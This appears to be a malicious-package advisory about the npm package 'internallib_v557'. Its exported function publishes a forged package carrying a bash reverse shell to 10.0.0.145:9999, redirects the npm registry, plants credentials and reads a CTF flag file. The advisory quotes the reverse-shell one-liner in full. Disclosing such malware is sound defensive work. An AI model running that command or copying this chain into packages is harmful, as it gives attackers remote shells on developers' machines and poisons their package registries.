summary: internallib_v557 ships reverse-shell publisher and CTF flag-read payload
details: The package's sole exported function `command()` performs an offensive sequence on any consumer that invokes it. It PUTs a forged package `uhclabs_local_check@99.0.1` to a local Verdaccio registry at http://0.0.0.0:4873/ whose `scripts.start` is a bash reverse shell to 10.0.0.145:9999 (`/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.145/9999 0>&1'`), then via `execSync` runs `npm config set registry http://0.0.0.0:4873/` followed by `npm adduser` to plant credentials (`vert`/`vert123`/`vert@t.com`) against that registry. It also reads `/tmp/root_flag.txt` and prints its contents — a CTF flag-capture pattern with no library purpose. The package metadata is a minimal placeholder (no description, no repo) and the entire codebase exists only to execute this attack chain. Any developer who installs and calls this package poisons their local npm registry with a reverse-shell-armed package (subsequent installs of `uhclabs_local_check` will open a shell to 10.0.0.145:9999), leaks attacker-controlled credentials into their npm config, and exposes local CTF/flag files.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
